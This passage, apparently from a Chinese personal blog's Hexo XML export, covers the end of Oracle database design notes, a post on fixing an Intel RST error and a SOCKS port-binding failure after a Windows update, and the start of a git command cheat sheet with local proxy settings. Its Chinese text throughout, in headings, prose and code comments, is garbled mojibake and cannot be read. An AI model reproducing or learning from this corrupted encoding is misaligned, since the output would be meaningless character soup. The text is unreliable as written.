<h3 id="2-ORACLE-Barkeræ–¹æ³•"><a href="#2-ORACLE-Barkeræ–¹æ³•" class="headerlink" title="2.ORACLE Barkeræ–¹æ³•"></a>2.ORACLE Barkeræ–¹æ³•</h3><p>åŒ…å«ä¸ƒä¸ªé˜¶æ®µ</p>
<ol>
<li>åˆ¶å®šç­–ç•¥</li>
<li>åˆ†æé˜¶æ®µ</li>
<li>è®¾è®¡é˜¶æ®µ</li>
<li>æ„å»ºé˜¶æ®µ</li>
<li>ç¼–å†™é˜¶æ®µ</li>
<li>è½¬æ¢é˜¶æ®µ</li>
<li>äº§å“é˜¶æ®µ</li>
</ol>
<h3 id="3-E-Ræ–¹æ³•"><a href="#3-E-Ræ–¹æ³•" class="headerlink" title="3.E-Ræ–¹æ³•"></a>3.E-Ræ–¹æ³•</h3><p>E-Rå›¾æ‰€æè¿°çš„æ¨¡å¼å«ä¼ä¸šæ¨¡å¼</p>
<p>ä¼ä¸šæ¨¡å¼å¼é¢å‘é—®é¢˜çš„ã€æ¦‚å¿µæ€§çš„æ¨¡å¼ï¼Œä¸DBMSæ— å…³ï¼Œæ˜¯é«˜çº§æ¦‚å¿µæ¨¡å‹</p>
<h4 id="åŸºäºE-Ræ–¹æ³•æ•°æ®åº“è®¾è®¡çš„ä¸€èˆ¬æ­¥éª¤"><a href="#åŸºäºE-Ræ–¹æ³•æ•°æ®åº“è®¾è®¡çš„ä¸€èˆ¬æ­¥éª¤" class="headerlink" title="åŸºäºE-Ræ–¹æ³•æ•°æ®åº“è®¾è®¡çš„ä¸€èˆ¬æ­¥éª¤"></a>åŸºäºE-Ræ–¹æ³•æ•°æ®åº“è®¾è®¡çš„ä¸€èˆ¬æ­¥éª¤</h4><ol>
<li>éœ€æ±‚åˆ†æ</li>
<li>æ¦‚å¿µè®¾è®¡</li>
<li>é€»è¾‘è®¾è®¡</li>
<li>ç‰©ç†è®¾è®¡</li>
<li>å®ç°è®¾è®¡</li>
</ol>
<h4 id="æ•°æ®åº“ç³»ç»Ÿå¼€å‘7ä¸ªé˜¶æ®µ"><a href="#æ•°æ®åº“ç³»ç»Ÿå¼€å‘7ä¸ªé˜¶æ®µ" class="headerlink" title="æ•°æ®åº“ç³»ç»Ÿå¼€å‘7ä¸ªé˜¶æ®µ"></a>æ•°æ®åº“ç³»ç»Ÿå¼€å‘7ä¸ªé˜¶æ®µ</h4><h5 id="1-è§„åˆ’é˜¶æ®µ"><a href="#1-è§„åˆ’é˜¶æ®µ" class="headerlink" title="1.è§„åˆ’é˜¶æ®µ"></a>1.è§„åˆ’é˜¶æ®µ</h5><h5 id="2-éœ€æ±‚åˆ†æ"><a href="#2-éœ€æ±‚åˆ†æ" class="headerlink" title="2.éœ€æ±‚åˆ†æ"></a>2.éœ€æ±‚åˆ†æ</h5><p>ç›®æ ‡</p>
<blockquote>
<p>åˆ†æç”¨æˆ·æ´»åŠ¨ï¼Œäº§ç”Ÿä¸šåŠ¡æµç¨‹å›¾</p>
<p>ç¡®å®šç³»ç»ŸèŒƒå›´ï¼Œäº§ç”Ÿç³»ç»ŸèŒƒå›´å›¾</p>
<p>åˆ†æç”¨æˆ·æ´»åŠ¨æ¶‰åŠçš„æ•°æ®ï¼Œäº§ç”Ÿæ•°æ®æµå›¾</p>
<p>åˆ†æç³»ç»Ÿæ•°æ®ï¼Œäº§ç”Ÿæ•°æ®å­—å…¸</p>
</blockquote>
<p><strong>å¦‚ä½•è·å¾—æ•°æ®å­—å…¸</strong></p>
<p>éœ€æ±‚æ”¶é›†å’Œåˆ†æ</p>
<p><strong>1.ä¿¡æ¯è¦æ±‚</strong></p>
<p>ç”¨æˆ·å¯¹å³å°†å»ºç«‹çš„æ•°æ®åº“æœ‰äº›ä»€ä¹ˆè¦æ±‚ï¼Ÿä¿å­˜ä»€ä¹ˆä¿¡æ¯ï¼Ÿè¦ä»æ•°æ®åº“ä¸­å¾—åˆ°ä»€ä¹ˆä¿¡æ¯ï¼Ÿæä¾›çš„æ•°æ®ä¸å–å¾—çš„ä¿¡æ¯æ˜¯ä»€ä¹ˆå½¢å¼ï¼Ÿç­‰ç­‰</p>
<p><strong>2.å¤„ç†è¦æ±‚</strong></p>
<p>å¦‚ä½•ä½¿ç”¨æ•°æ®ï¼Ÿå¯¹å„ç§æ•°æ®çš„ä½¿ç”¨é¢‘ç‡å¦‚ä½•ï¼Ÿæ£€ç´¢æ–¹å¼å¦‚ä½•ï¼Ÿè¦è¾“å‡ºé‚£äº›è¡¨æ ¼ï¼Ÿè¢«å­˜å–çš„æ•°æ®é‡ä¸è¿è¡Œé™åˆ¶ç­‰</p>
<p><strong>3.åŠŸèƒ½è¦æ±‚</strong></p>
<p>å¯¹å°†è¦å»ºç«‹çš„ä¿¡æ¯ç³»ç»Ÿåº”å…·æœ‰é‚£äº›åŠŸèƒ½ï¼Ÿèƒ½ç»™ç»„ç»‡è§£å†³é‚£äº›å¤„ç†é—®é¢˜ï¼ŸåŠŸèƒ½è¦æ±‚åŒ…æ‹¬è§„åˆ’çš„ã€ç°å­˜çš„ã€äººå·¥çš„æˆ–<br>è‡ªåŠ¨çš„ç­‰å„æ–¹é¢ã€‚</p>
<p><strong>4.ç¯å¢ƒç‰¹å¾</strong></p>
<p>ä¼ä¸šçš„è§„æ¨¡ä¸ç»“æ„ã€éƒ¨é—¨çš„åœ°ç†åˆ†å¸ƒã€ç°æœ‰ç³»ç»Ÿèµ„æºã€æ•°æ®åº“çš„å®‰å…¨æ€§ã€å®Œæ•´æ€§é™åˆ¶ä»¥åŠï¼¤ï¼¢ï¼­ï¼³ä¸è¿è¡Œç¯<br>å¢ƒçº¦æŸç­‰</p>
<p><strong>ç»“æœï¼š</strong>æ•°æ®å­—å…¸ï¼ˆæ•°æ®é¡¹ã€æ•°æ®ç»“æ„ã€æ•°æ®æµã€æ•°æ®å­˜å‚¨å’Œå¤„ç†è¿‡ç¨‹äº”ä¸ªé˜¶æ®µï¼‰</p>
<h5 id="3-æ¦‚å¿µè®¾è®¡"><a href="#3-æ¦‚å¿µè®¾è®¡" class="headerlink" title="3.æ¦‚å¿µè®¾è®¡"></a>3.æ¦‚å¿µè®¾è®¡</h5>]]></content>
      <categories>
        <category>Note</category>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>Windowsä¸“ä¸šç‰ˆ19013å‡çº§è¸©å‘</title>
    <url>/2019/11/13/Note/window%E4%B8%93%E4%B8%9A%E7%89%8819013%E5%8D%87%E7%BA%A7%E8%B8%A9%E5%9D%91/</url>
    <content><![CDATA[<h1 id="Windowsä¸“ä¸šç‰ˆ19013å‡çº§è¸©å‘"><a href="#Windowsä¸“ä¸šç‰ˆ19013å‡çº§è¸©å‘" class="headerlink" title="Windowsä¸“ä¸šç‰ˆ19013å‡çº§è¸©å‘"></a>Windowsä¸“ä¸šç‰ˆ19013å‡çº§è¸©å‘</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å‚æ™šæ­£åœ¨å†™ç€ä½œä¸šï¼Œçªç„¶è·³å‡ºwindowæ›´æ–°ï¼Œæ¯•ç«Ÿé€‰äº†æ…¢æ¨é€,å¿ƒæƒ³æ²¡ä»€ä¹ˆå¯æ€•çš„ï¼Œå¯äº‹æƒ…æ°¸è¿œä¸ä¼šé‚£ä¹ˆç®€å•ï¼ï¼ï¼</p>
<p>ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p>
<a id="more"></a>

<h2 id="ç¬¬ä¸€å‘"><a href="#ç¬¬ä¸€å‘" class="headerlink" title="ç¬¬ä¸€å‘"></a>ç¬¬ä¸€å‘</h2><h3 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜:"></a>é—®é¢˜:</h3><p>å¼€æœºå°±æŠ¥é”™ï¼ŒWindowsèµ„æºç®¡ç†å™¨æŠ¥é”™Inter Optane(tm) Memory Pinningæ— æ³•åŠ è½½DLLâ€iaStorAfsService.dllâ€:æ‰¾ä¸åˆ°æŒ‡å®šæ¨¡å—ã€‚(å¼‚å¸¸æ¥è‡ªäºHRESULT:0x8007007E)ã€‚</p>
<p><a href="https://yanmymickey.github.io/images/inter%E6%8A%A5%E9%94%99.jpg"><img src="https://yanmymickey.github.io/images/inter%E6%8A%A5%E9%94%99.jpg" alt="Inter Optane(tm) Memory Pinning"></a></p>
<p>å³ä¸‹è§’ä¹Ÿä¸è§äº†è‹±ç‰¹å°”å¿«é€Ÿå­˜å‚¨çš„ç¨‹åºå›¾æ ‡</p>
<h3 id="è§£å†³åŠæ³•"><a href="#è§£å†³åŠæ³•" class="headerlink" title="è§£å†³åŠæ³•:"></a>è§£å†³åŠæ³•:</h3><ol>
<li><p>æŸ¥çœ‹ç›¸å…³æœåŠ¡ï¼Œæ²¡æœ‰å¯åŠ¨ï¼Œå‘ç°æœ‰æ–°ç¨‹åºæ‰“å¼€ç­‰ç­‰éœ€è¦è¯»å†™å†…å­˜çš„æƒ…å†µä¸‹ï¼Œå°±ä¼šæŠ¥é”™ã€‚ç„¶åç”±äºæ˜¯DELLç¬”è®°æœ¬ï¼Œå°±å»DELLå®˜ç½‘æŸ¥è¯¢ç›¸å…³é©±åŠ¨ç¨‹åºï¼Œä¸‹è½½äº†<a href="https://dl.dell.com/FOLDER05652684M/2/Intel-Rapid-Storage-Technology-Driver-and-Management_589C4_WIN_17.5.0.1017_A00.EXE?uid=3207dc64-199a-42f0-a5be-de600ce86f86&fn=Intel-Rapid-Storage-Technology-Driver-and-Management_589C4_WIN_17.5.0.1017_A00.EXE">Inter-Repaid-Storage-Technology-Driver-and-Managerment.exe</a>ï¼Œè¿è¡Œå¹¶å°è¯•ä¿®å¤ï¼Œä½†æ˜¯ä¸èµ·ä½œç”¨</p>
</li>
<li><p>æœç´¢åå‘ç°ï¼Œinterå®˜ç½‘æœ‰æ›´å¥½çš„ä¿®å¤å·¥å…·ï¼Œ <a href="https://downloadcenter.intel.com/downloads/eula/29007/Intel-Rapid-Storage-Technology-Intel-RST-User-Interface-and-Driver?httpDown=https://downloadmirror.intel.com/29007/eng/f6flpy-x64.zip&linkId=72858866">interå®˜ç½‘ä¿®å¤å·¥å…·f6flpy.zip</a>ï¼Œä¸‹è½½å‹ç¼©åŒ…åè§£å‹ï¼Œè¿è¡Œï¼Œç„¶åä¼šæç¤ºé‡å¯ï¼Œé‡å¯åä¸å†æç¤ºé”™è¯¯ï¼Œé—®é¢˜è§£å†³</p>
<p><a href="https://yanmymickey.github.io/images/%E4%BF%AE%E5%A4%8D%E5%B7%A5%E5%85%B7.jpg"><img src="https://yanmymickey.github.io/images/%E4%BF%AE%E5%A4%8D%E5%B7%A5%E5%85%B7.jpg" alt="ä¿®å¤å·¥å…·è¿è¡Œ"></a></p>
</li>
</ol>
<h3 id="åŸå› åˆ†æï¼š"><a href="#åŸå› åˆ†æï¼š" class="headerlink" title="åŸå› åˆ†æï¼š"></a>åŸå› åˆ†æï¼š</h3><p>åº”è¯¥æ˜¯è¯¥ç¨‹åºæ‰©å±•ä¸¢å¤±ï¼Œé€ æˆç¨‹åºå’ŒæœåŠ¡æ— æ³•å¯åŠ¨ï¼Œä¿®å¤å·¥å…·å°†æ‰©å±•è£…å›ï¼ŒæˆåŠŸè§£å†³é—®é¢˜</p>
<h2 id="ç¬¬äºŒå‘"><a href="#ç¬¬äºŒå‘" class="headerlink" title="ç¬¬äºŒå‘"></a>ç¬¬äºŒå‘</h2><h3 id="é—®é¢˜ï¼š"><a href="#é—®é¢˜ï¼š" class="headerlink" title="é—®é¢˜ï¼š"></a>é—®é¢˜ï¼š</h3><p>æŸsocksè½¯ä»¶æŠ¥é”™ç”±äºæƒé™ç­‰æ„¿æ„ç»‘å®šæœ¬åœ°ç«¯å£10808å¤±è´¥ï¼Œå¯¼è‡´æµé‡æ— æ³•é€šè¿‡ç¨‹åºã€‚</p>
<h3 id="è§£å†³ï¼š"><a href="#è§£å†³ï¼š" class="headerlink" title="è§£å†³ï¼š"></a>è§£å†³ï¼š</h3><ol>
<li>ç®¡ç†å‘˜æƒé™è¿è¡Œpowershellï¼Œè¾“å…¥nestat -ano|findstr â€10808â€œæ— æ˜¾ç¤ºï¼Œæ²¡æœ‰ç¨‹åºå ç”¨ç«¯å£ã€‚</li>
<li>ç¨‹åºæ¢æˆ10800ç«¯å£ä»ç„¶ä¸è¡Œï¼Œå†æ¬¡æŸ¥çœ‹ç«¯å£å ç”¨è¿˜æ˜¯æ²¡æœ‰ç¨‹åºå ç”¨</li>
<li>æ‰“å¼€æ§åˆ¶é¢æ¿-&gt;windows Defender é˜²ç«å¢™-&gt;é«˜çº§è®¾ç½®-&gt;æ·»åŠ UDPå’ŒTCPçš„å…¥ç«™è§„åˆ™ï¼Œé‡å¯ç”µè„‘ï¼Œæ²¡æœ‰è§£å†³ã€‚å¯èƒ½æ˜¯è®¾ç½®äº†å¼€æœºè¿è¡Œçš„ç¼˜æ•…</li>
<li>æŠŠå¼€æœºè¿è¡Œå…³é—­ï¼Œé‡å¤ç¬¬ä¸‰æ­¥ï¼Œç­‰å¾…ç³»ç»Ÿå®Œå…¨å¯åŠ¨å†è¿è¡Œè¯¥è½¯ä»¶ï¼Œå‘ç°æ— é—®é¢˜ï¼Œè²Œä¼¼æˆåŠŸè§£å†³</li>
<li>äº‹æƒ…æ²¡è¿™ä¹ˆç®€å•ï¼Œä¸­åˆå†æ¬¡å¼€æœºè¿è¡Œï¼Œä¸‰å››æ­¥éƒ½å°è¯•å‡å¤±æ•ˆï¼Œäºæ˜¯å°è¯•å…¶ä»–è½¯ä»¶èƒ½å¦ç»‘å®šè¿™ä¸ªç«¯å£</li>
<li>å‘ç°å…¶ä»–è½¯ä»¶éƒ½æ— æ³•ç»‘å®šè¿™ä¸ªç«¯å£ï¼Œå¹¶æ˜¾ç¤ºæŠ¥é”™ï¼Œ10808ç«¯å£ä¸ºç³»ç»Ÿé¢„ç•™ç«¯å£ï¼ŒI/Oå †æ ˆé”™è¯¯</li>
<li>é‚åˆ‡æ¢æ€è·¯,å…¶ä»–è½¯ä»¶å¯ä»¥ç»‘å®š1080ç«¯å£ï¼Œé‚£ä¸å¦‚å°±å°†è¯¥è½¯ä»¶ç»‘å®š1080ç«¯å£ï¼Œåˆ‡æ¢ç«¯å£ï¼ŒæˆåŠŸ</li>
</ol>
<h3 id="åˆ†æï¼š"><a href="#åˆ†æï¼š" class="headerlink" title="åˆ†æï¼š"></a>åˆ†æï¼š</h3><p>æœ¬åº”è¯¥æ—©ä¸€ç‚¹è¿›å…¥ç¬¬ä¸ƒæ­¥ï¼Œä½†æ˜¯é¡¾åŠè¯¥è½¯ä»¶è¿˜éœ€è¦å ç”¨ä¸€ä¸ª10809ç«¯å£ç”¨äºhttpï¼Œä»¥ä¸ºåªåˆ‡æ¢10808ç«¯å£ä¸èƒ½è§£å†³é—®é¢˜ï¼Œå¿˜è®°æ›¾ç»æŸ¥çœ‹è¯¥è½¯ä»¶æºç httpè¦ç”¨çš„10809ä¸ºsocksç»‘å®šçš„ç«¯å£å·+1ï¼Œæµªè´¹äº›è®¸æ—¶é—´ã€‚</p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>Windowsçš„æ›´æ–°ï¼šæ–°åŠŸèƒ½ä¸çŸ¥é“æœ‰ä»€ä¹ˆï¼Œbugå€’æ˜¯ç«‹é©¬å‡ºç°/doge</p>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Note</tag>
      </tags>
  </entry>
  <entry>
    <title>Gitå¸¸ç”¨å‘½ä»¤æ¸…å•</title>
    <url>/2019/11/03/Note/%E5%B8%B8%E7%94%A8git%E5%91%BD%E4%BB%A4%E6%B8%85%E5%8D%95/</url>
    <content><![CDATA[<h1 id="Gitå¸¸ç”¨å‘½ä»¤æ¸…å•"><a href="#Gitå¸¸ç”¨å‘½ä»¤æ¸…å•" class="headerlink" title="Gitå¸¸ç”¨å‘½ä»¤æ¸…å•"></a>Gitå¸¸ç”¨å‘½ä»¤æ¸…å•</h1><h2 id="ä¸€ã€æ–°å»ºä»£ç åº“"><a href="#ä¸€ã€æ–°å»ºä»£ç åº“" class="headerlink" title="ä¸€ã€æ–°å»ºä»£ç åº“"></a>ä¸€ã€æ–°å»ºä»£ç åº“</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># åœ¨å½“å‰ç›®å½•æ–°å»ºä¸€ä¸ªGitä»£ç åº“</span><br><span class="line">git init</span><br><span class="line"></span><br><span class="line"># æ–°å»ºä¸€ä¸ªç›®å½•ï¼Œå°†å…¶åˆå§‹åŒ–ä¸ºGitä»£ç åº“</span><br><span class="line">git init [project-name]</span><br><span class="line"></span><br><span class="line"># ä¸‹è½½ä¸€ä¸ªé¡¹ç›®å’Œå®ƒçš„æ•´ä¸ªä»£ç å†å²</span><br><span class="line">git clone [url]</span><br></pre></td></tr></table></figure>
<a id="more"></a>

<h2 id="äºŒã€é…ç½®"><a href="#äºŒã€é…ç½®" class="headerlink" title="äºŒã€é…ç½®"></a>äºŒã€é…ç½®</h2><p>Gitçš„è®¾ç½®æ–‡ä»¶ä¸º<code>.gitconfig</code>ï¼Œå®ƒå¯ä»¥åœ¨ç”¨æˆ·ä¸»ç›®å½•ä¸‹ï¼ˆå…¨å±€é…ç½®ï¼‰ï¼Œä¹Ÿå¯ä»¥åœ¨é¡¹ç›®ç›®å½•ä¸‹ï¼ˆé¡¹ç›®é…ç½®ï¼‰ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># æ˜¾ç¤ºå½“å‰çš„Gité…ç½®</span><br><span class="line">git config --list</span><br><span class="line"></span><br><span class="line"># ç¼–è¾‘Gité…ç½®æ–‡ä»¶</span><br><span class="line">git config -e [--global]</span><br><span class="line"></span><br><span class="line"># è®¾ç½®æäº¤ä»£ç æ—¶çš„ç”¨æˆ·ä¿¡æ¯</span><br><span class="line">git config [--global] user.name &quot;[name]&quot;</span><br><span class="line">git config [--global] user.email &quot;[email address]&quot;</span><br><span class="line"></span><br><span class="line">#ä¸ºgité…ç½®å…¨å±€ä»£ç†</span><br><span class="line">git config --global http.proxy socks5:&#x2F;&#x2F;127.0.0.1:1080</span><br><span class="line">git config --global https.proxy socks5:&#x2F;&#x2F;127.0.0.1:1080</span><br><span class="line">git config --global https.proxy http:&#x2F;&#x2F;127.0.0.1:1080</span><br><span class="line">git config --global https.proxy https:&#x2F;&#x2F;127.0.0.1:1080</span><br><span class="line">#å–æ¶ˆä»£ç†</span><br><span class="line">git config --global --unset http.proxy</span><br><span class="line">git config --global --unset https.proxy</span><br><span class="line"></span><br><span class="line">#åªå¯¹github.com</span><br><span class="line">git config --global http.https:&#x2F;&#x2F;github.com.proxy socks5:&#x2F;&#x2F;127.0.0.1:1080</span><br><span class="line">#å–æ¶ˆä»£ç†</span><br><span class="line">git config --global --unset http.https:&#x2F;&#x2F;github.com.proxy</span><br><span class="line"></span><br><span class="line">#é…ç½®å®Œä»£ç†åé…ç½®æ–‡ä»¶å°†å‡ºç°ä¸‹é¢ç±»ä¼¼å­—æ®µ</span><br><span class="line">[http]</span><br><span class="line">    proxy&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:1080</span><br><span class="line">[https]</span><br><span class="line">    proxy&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:1080</span><br></pre></td></tr></table></figure>
<h2 id="ä¸‰ã€å¢åŠ -åˆ é™¤æ–‡ä»¶"><a href="#ä¸‰ã€å¢åŠ -åˆ é™¤æ–‡ä»¶" class="headerlink" title="ä¸‰ã€å¢åŠ /åˆ é™¤æ–‡ä»¶"></a>ä¸‰ã€å¢åŠ /åˆ é™¤æ–‡ä»¶</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># æ·»åŠ æŒ‡å®šæ–‡ä»¶åˆ°æš‚å­˜åŒº</span><br><span class="line">git add [file1] [file2] ...</span><br><span class="line"></span><br><span class="line"># æ·»åŠ æŒ‡å®šç›®å½•åˆ°æš‚å­˜åŒºï¼ŒåŒ…æ‹¬å­ç›®å½•</span><br><span class="line">git add [dir]</span><br><span class="line"></span><br><span class="line"># æ·»åŠ å½“å‰ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶åˆ°æš‚å­˜åŒº</span><br><span class="line">git add .</span><br><span class="line"></span><br><span class="line"># æ·»åŠ æ¯ä¸ªå˜åŒ–å‰ï¼Œéƒ½ä¼šè¦æ±‚ç¡®è®¤</span><br><span class="line"># å¯¹äºåŒä¸€ä¸ªæ–‡ä»¶çš„å¤šå¤„å˜åŒ–ï¼Œå¯ä»¥å®ç°åˆ†æ¬¡æäº¤</span><br><span class="line">git add -p</span><br><span class="line"></span><br><span class="line"># åˆ é™¤å·¥ä½œåŒºæ–‡ä»¶ï¼Œå¹¶ä¸”å°†è¿™æ¬¡åˆ é™¤æ”¾å…¥æš‚å­˜åŒº</span><br><span class="line">git rm [file1] [file2] ...</span><br><span class="line"></span><br><span class="line"># åœæ­¢è¿½è¸ªæŒ‡å®šæ–‡ä»¶ï¼Œä½†è¯¥æ–‡ä»¶ä¼šä¿ç•™åœ¨å·¥ä½œåŒº</span><br><span class="line">git rm --cached [file]</span><br><span class="line"></span><br><span class="line"># æ”¹åæ–‡ä»¶ï¼Œå¹¶ä¸”å°†è¿™ä¸ªæ”¹åæ”¾å…¥æš‚å­˜åŒº</span><br><span class="line">git mv [file-original] [file-renamed]</span><br></pre></td></tr></table></figure>
<h2 id="å››ã€ä»£ç æäº¤"><a href="#å››ã€ä»£ç æäº¤" class="headerlink" title="å››ã€ä»£ç æäº¤"></a>å››ã€ä»£ç æäº¤</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># æäº¤æš‚å­˜åŒºåˆ°ä»“åº“åŒº</span><br><span class="line">git commit -m [message]</span><br><span class="line"></span><br><span class="line"># æäº¤æš‚å­˜åŒºçš„æŒ‡å®šæ–‡ä»¶åˆ°ä»“åº“åŒº</span><br><span class="line">git commit [file1] [file2] ... -m [message]</span><br><span class="line"></span><br><span class="line"># æäº¤å·¥ä½œåŒºè‡ªä¸Šæ¬¡commitä¹‹åçš„å˜åŒ–ï¼Œç›´æ¥åˆ°ä»“åº“åŒº</span><br><span class="line">git commit -a</span><br><span class="line"></span><br><span class="line"># æäº¤æ—¶æ˜¾ç¤ºæ‰€æœ‰diffä¿¡æ¯</span><br><span class="line">git commit -v</span><br><span class="line"></span><br><span class="line"># ä½¿ç”¨ä¸€æ¬¡æ–°çš„commitï¼Œæ›¿ä»£ä¸Šä¸€æ¬¡æäº¤</span><br><span class="line"># å¦‚æœä»£ç æ²¡æœ‰ä»»ä½•æ–°å˜åŒ–ï¼Œåˆ™ç”¨æ¥æ”¹å†™ä¸Šä¸€æ¬¡commitçš„æäº¤ä¿¡æ¯</span><br><span class="line">git commit --amend -m [message]</span><br><span class="line"></span><br><span class="line"># é‡åšä¸Šä¸€æ¬¡commitï¼Œå¹¶åŒ…æ‹¬æŒ‡å®šæ–‡ä»¶çš„æ–°å˜åŒ–</span><br><span class="line">git commit --amend [file1] [file2] ...</span><br></pre></td></tr></table></figure>
<h2 id="äº”ã€åˆ†æ”¯"><a href="#äº”ã€åˆ†æ”¯" class="headerlink" title="äº”ã€åˆ†æ”¯"></a>äº”ã€åˆ†æ”¯</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># åˆ—å‡ºæ‰€æœ‰æœ¬åœ°åˆ†æ”¯</span><br><span class="line">git branch</span><br><span class="line"></span><br><span class="line"># åˆ—å‡ºæ‰€æœ‰è¿œç¨‹åˆ†æ”¯</span><br><span class="line">git branch -r</span><br><span class="line"></span><br><span class="line"># åˆ—å‡ºæ‰€æœ‰æœ¬åœ°åˆ†æ”¯å’Œè¿œç¨‹åˆ†æ”¯</span><br><span class="line">git branch -a</span><br><span class="line"></span><br><span class="line"># æ–°å»ºä¸€ä¸ªåˆ†æ”¯ï¼Œä½†ä¾ç„¶åœç•™åœ¨å½“å‰åˆ†æ”¯</span><br><span class="line">git branch [branch-name]</span><br><span class="line"></span><br><span class="line"># æ–°å»ºä¸€ä¸ªåˆ†æ”¯ï¼Œå¹¶åˆ‡æ¢åˆ°è¯¥åˆ†æ”¯</span><br><span class="line">git checkout -b [branch]</span><br><span class="line"></span><br><span class="line"># æ–°å»ºä¸€ä¸ªåˆ†æ”¯ï¼ŒæŒ‡å‘æŒ‡å®šcommit</span><br><span class="line">git branch [branch] [commit]</span><br><span class="line"></span><br><span class="line"># æ–°å»ºä¸€ä¸ªåˆ†æ”¯ï¼Œä¸æŒ‡å®šçš„è¿œç¨‹åˆ†æ”¯å»ºç«‹è¿½è¸ªå…³ç³»</span><br><span class="line">git branch --track [branch] [remote-branch]</span><br><span class="line"></span><br><span class="line"># åˆ‡æ¢åˆ°æŒ‡å®šåˆ†æ”¯ï¼Œå¹¶æ›´æ–°å·¥ä½œåŒº</span><br><span class="line">git checkout [branch-name]</span><br><span class="line"></span><br><span class="line"># åˆ‡æ¢åˆ°ä¸Šä¸€ä¸ªåˆ†æ”¯</span><br><span class="line">git checkout -</span><br><span class="line"></span><br><span class="line"># å»ºç«‹è¿½è¸ªå…³ç³»ï¼Œåœ¨ç°æœ‰åˆ†æ”¯ä¸æŒ‡å®šçš„è¿œç¨‹åˆ†æ”¯ä¹‹é—´</span><br><span class="line">git branch --set-upstream [branch] [remote-branch]</span><br><span class="line"></span><br><span class="line"># åˆå¹¶æŒ‡å®šåˆ†æ”¯åˆ°å½“å‰åˆ†æ”¯</span><br><span class="line">git merge [branch]</span><br><span class="line"></span><br><span class="line"># é€‰æ‹©ä¸€ä¸ªcommitï¼Œåˆå¹¶è¿›å½“å‰åˆ†æ”¯</span><br><span class="line">git cherry-pick [commit]</span><br><span class="line"></span><br><span class="line"># åˆ é™¤åˆ†æ”¯</span><br><span class="line">git branch -d [branch-name]</span><br><span class="line"></span><br><span class="line"># åˆ é™¤è¿œç¨‹åˆ†æ”¯</span><br><span class="line">git push origin --delete [branch-name]</span><br><span class="line">git branch -dr [remote&#x2F;branch]</span><br></pre></td></tr></table></figure>
<h2 id="å…­ã€æ ‡ç­¾"><a href="#å…­ã€æ ‡ç­¾" class="headerlink" title="å…­ã€æ ‡ç­¾"></a>å…­ã€æ ‡ç­¾</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># åˆ—å‡ºæ‰€æœ‰tag</span><br><span class="line">git tag</span><br><span class="line"></span><br><span class="line"># æ–°å»ºä¸€ä¸ªtagåœ¨å½“å‰commit</span><br><span class="line">git tag [tag]</span><br><span class="line"></span><br><span class="line"># æ–°å»ºä¸€ä¸ªtagåœ¨æŒ‡å®šcommit</span><br><span class="line">git tag [tag] [commit]</span><br><span class="line"></span><br><span class="line"># åˆ é™¤æœ¬åœ°tag</span><br><span class="line">git tag -d [tag]</span><br><span class="line"></span><br><span class="line"># åˆ é™¤è¿œç¨‹tag</span><br><span class="line">git push origin :refs&#x2F;tags&#x2F;[tagName]</span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹tagä¿¡æ¯</span><br><span class="line">git show [tag]</span><br><span class="line"></span><br><span class="line"># æäº¤æŒ‡å®štag</span><br><span class="line">git push [remote] [tag]</span><br><span class="line"></span><br><span class="line"># æäº¤æ‰€æœ‰tag</span><br><span class="line">git push [remote] --tags</span><br><span class="line"></span><br><span class="line"># æ–°å»ºä¸€ä¸ªåˆ†æ”¯ï¼ŒæŒ‡å‘æŸä¸ªtag</span><br><span class="line">git checkout -b [branch] [tag]</span><br></pre></td></tr></table></figure>
<h2 id="ä¸ƒã€æŸ¥çœ‹ä¿¡æ¯"><a href="#ä¸ƒã€æŸ¥çœ‹ä¿¡æ¯" class="headerlink" title="ä¸ƒã€æŸ¥çœ‹ä¿¡æ¯"></a>ä¸ƒã€æŸ¥çœ‹ä¿¡æ¯</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># æ˜¾ç¤ºæœ‰å˜æ›´çš„æ–‡ä»¶</span><br><span class="line">git status</span><br><span class="line"></span><br><span class="line"># æ˜¾ç¤ºå½“å‰åˆ†æ”¯çš„ç‰ˆæœ¬å†å²</span><br><span class="line">git log</span><br><span class="line"></span><br><span class="line"># æ˜¾ç¤ºcommitå†å²ï¼Œä»¥åŠæ¯æ¬¡commitå‘ç”Ÿå˜æ›´çš„æ–‡ä»¶</span><br><span class="line">git log --stat</span><br><span class="line"></span><br><span class="line"># æœç´¢æäº¤å†å²ï¼Œæ ¹æ®å…³é”®è¯</span><br><span class="line">git log -S [keyword]</span><br><span class="line"></span><br><span class="line"># æ˜¾ç¤ºæŸä¸ªcommitä¹‹åçš„æ‰€æœ‰å˜åŠ¨ï¼Œæ¯ä¸ªcommitå æ®ä¸€è¡Œ</span><br><span class="line">git log [tag] HEAD --pretty&#x3D;format:%s</span><br><span class="line"></span><br><span class="line"># æ˜¾ç¤ºæŸä¸ªcommitä¹‹åçš„æ‰€æœ‰å˜åŠ¨ï¼Œå…¶&quot;æäº¤è¯´æ˜&quot;å¿…é¡»ç¬¦åˆæœç´¢æ¡ä»¶</span><br><span class="line">git log [tag] HEAD --grep feature</span><br><span class="line"></span><br><span class="line"># æ˜¾ç¤ºæŸä¸ªæ–‡ä»¶çš„ç‰ˆæœ¬å†å²ï¼ŒåŒ…æ‹¬æ–‡ä»¶æ”¹å</span><br><span class="line">git log --follow [file]</span><br><span class="line">git whatchanged [file]</span><br><span class="line"></span><br><span class="line"># 